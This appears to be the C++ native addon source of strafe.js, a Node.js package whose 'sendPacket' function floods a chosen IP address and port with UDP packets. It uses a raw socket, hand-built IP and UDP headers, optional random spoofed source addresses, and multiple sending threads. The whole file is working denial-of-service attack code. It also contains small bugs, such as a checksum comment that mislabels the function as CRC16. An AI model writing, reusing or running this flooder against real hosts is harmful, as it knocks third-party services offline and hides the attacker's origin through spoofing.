/*
 * This file is part of strafe.js <https://github.com/hmes98318/strafe.js>
 * Copyright (C) 2022-2023  hmes98318  <hmes98318@gmail.com>
 *
 * strafe.js is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * strafe.js is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with strafe.js.  If not, see <https://www.gnu.org/licenses/>.
 */


#include <node.h>
#include <nan.h>

#include <iostream>
#include <cstring>
#include <climits>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <chrono>
#include <thread>

#define sleep_ms(milsec) usleep(milsec * 1000)

using namespace v8;


int sockfd; // raw socket
char dst_ip[20] = {0};
int dst_port;

struct Ip
{
    u_char ver_ihl;    // Version and IP Header Length (IHL)
    u_char tos;        // Type of Service
    u_short total_len; // Total length of the IP datagram
    u_short id;        // Identification
    u_short frag_off;  // Fragment Offset
    u_char ttl;        // Time to Live
    u_char protocol;   // Protocol
    u_short checksum;  // IP Header Checksum
    u_int32_t saddr;   // Source IP Address
    u_int32_t daddr;   // Destination IP Address
};
/*
 *  0                   1                   2                   3
 *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |Version|  IHL  |Type of Service|          Total Length         |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |         Identification        |Flags|      Fragment Offset    |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |  Time to Live |    Protocol   |         Header Checksum       |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                       Source Address                          |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                    Destination Address                        |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                    Options                    |    Padding    |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 */

struct Udp
{
    u_short sport;    // Source Port Number
    u_short dport;    // Destination Port Number
    u_short len;      // Length of the entire UDP packet
    u_short checksum; // UDP Checksum
};
/*
 *  0                   1                   2                   3
 *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |           Source Port          |       Destination Port       |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |             Length            |            Checksum           |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 *  |                             data                              |
 *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 */

struct Pseudo
{
    u_int32_t saddr;  // Source IP Address
    u_int32_t daddr;  // Destination IP Address
    uint8_t zero;     // Zero
    uint8_t protocol; // Protocol
    uint16_t length;  // Length of the UDP segment
};

/* Generate random ipv4 address*/
char *generate_ipv4()
{
    uint32_t ipv4_addr = 0;
    char *ipv4_str = (char *)malloc(INET_ADDRSTRLEN);

    for (int i = 0; i < 4; i++)
    {
        ipv4_addr |= (rand() % 256) << (i * 8);
    }

    inet_ntop(AF_INET, &ipv4_addr, ipv4_str, INET_ADDRSTRLEN);
    return ipv4_str;
}

/* Generate random port*/
int generate_port() {
    return ((rand() % (65535-10240+1)) + 10240);
}

/* Generate random hex array*/
u_char *generate_hex_array(int length)
{
    u_char *array;
    array = (u_char *)malloc(length);

    for (int i = 0; i < length; i++)
    {
        array[i] = rand() % 256;
    }
    return array;
}

uint16_t ip_checksum(const void *buf, size_t hdr_len)
{
    const uint16_t *data = static_cast<const uint16_t *>(buf);
    uint32_t acc = 0;

    for (size_t i = 0; i < hdr_len; i += 2)
    {
        if (i + 1 == hdr_len)
        {
            acc += static_cast<uint16_t>(data[i]) << 8;
        }
        else
        {
            acc += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
        }
    }

    acc = (acc >> 16) + (acc & 0xFFFF);
    acc = (acc >> 16) + (acc & 0xFFFF);

    return static_cast<uint16_t>(~acc);
}

/* CRC16 checksum calculator */
u_short udp_checksum(unsigned short *ptr, int nbytes)
{
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);

    return (short)(~sum);
}

/* Fill in IP header, UDP header, Pseudo UDP header */
void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *buf, int packetsize, int fakeIp, struct in_addr sin_addr)
{
    char *src_ip = inet_ntoa(*(struct in_addr *)&sin_addr);
    if(fakeIp == 1) src_ip = generate_ipv4();

    // IP header
    ip->ver_ihl = (4 << 4) | (sizeof(Ip) / sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = sizeof(struct Ip) + sizeof(struct Udp) + packetsize;
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->checksum = 0;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    ip->checksum = ip_checksum((u_short *)buf, ip->total_len);

    // UDP header
    udp->sport = htons(generate_port());
    udp->dport = htons(dst_port);
    udp->len = htons(sizeof(struct Udp) + packetsize);
    udp->checksum = 0;

    // Pseudo UDP header
    pseudo->saddr = inet_addr(src_ip);
    pseudo->daddr = inet_addr(dst_ip);
    pseudo->zero = 0;
    pseudo->protocol = IPPROTO_UDP;
    pseudo->length = htons(sizeof(struct Udp) + packetsize);
}

void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsize = 10, int fakeIp = 0)
{
    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;

    char buf[1460], *pseudogram;
    memset(buf, 0, sizeof(buf)); // char buf[100], *pseudogram;

    struct Ip *ip = (struct Ip *)buf;
    struct Udp *udp = (struct Udp *)(buf + sizeof(struct Ip));
    struct Pseudo pseudo;

    char *data = buf + sizeof(struct Ip) + sizeof(struct Udp);
    int count = 0; // Packet sent count

    auto start_time = std::chrono::steady_clock::now();
    srand((unsigned)time(NULL));

    while (true)
    {
        strcpy(data, (const char *)generate_hex_array(packetsize));
        init_header(ip, udp, &pseudo, buf, packetsize, fakeIp, addr->sin_addr);

        int psize = sizeof(struct Pseudo) + sizeof(struct Udp) + packetsize;
        pseudogram = (char *)malloc(psize);

        memcpy(pseudogram, (char *)&pseudo, sizeof(struct Pseudo));
        memcpy(pseudogram + sizeof(struct Pseudo), udp, sizeof(struct Udp) + packetsize);

        // Calculate Pseudo UDP header checksum
        udp->checksum = udp_checksum((u_short *)pseudogram, psize);

        // Send data packet
        if (sendto(sockfd, buf, ip->total_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr)) < 0)
        {
            perror("sendto()");
            exit(EXIT_FAILURE);
        }

        printf("\033[F");
        printf("Sent UDP Packet: %d       \n", count++);

        // Timeout Checker
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();

        if (elapsed_seconds >= timeout)
        {
            break;
        }

        // sleep for milliseconds
        sleep_ms(delay);
    }
    return 0;
}

void Method(const FunctionCallbackInfo<Value> &args)
{
    Isolate *isolate = args.GetIsolate();

    // Initialize Socket
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    int on = 1; // Custom UDP pakcet
    int timeout = args[2]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int packetsize = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int numThreads = args[5]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int fakeIp = args[6]->Int32Value(isolate->GetCurrentContext()).ToChecked();

    // Get the destination IP address and port number from the arguments
    String::Utf8Value str_ip(isolate, args[0]);
    String::Utf8Value str_port(isolate, args[1]);
    const char *ip = *str_ip;
    const char *port = *str_port;

    strncpy(dst_ip, ip, 16);
    dst_port = atoi(port);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(dst_ip);
    addr.sin_port = htons(dst_port);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }
    
    if (setuid(getpid()) == -1)
    {
        perror("setuid()");
        exit(EXIT_FAILURE);
    }

    printf("start process.\n");

    // Create threads
    std::thread threads[numThreads];
    for (int i = 0; i < numThreads; i++)
    {
        threads[i] = std::thread(send_UDP, &addr, timeout, delay, packetsize, fakeIp);

        if (threads[i].get_id() == std::thread::id())
        {
            printf("Failed to create thread %d", i);
            exit(EXIT_FAILURE);
        }
        printf("\n");
    }

    for (int i = 0; i < numThreads; i++)
    {
        threads[i].join();
    }

    printf("Stop all process.\n");
    close(sockfd);
}

void Initialize(Local<Object> exports)
{
    NODE_SET_METHOD(exports, "sendPacket", Method);
}

NODE_MODULE(addon, Initialize)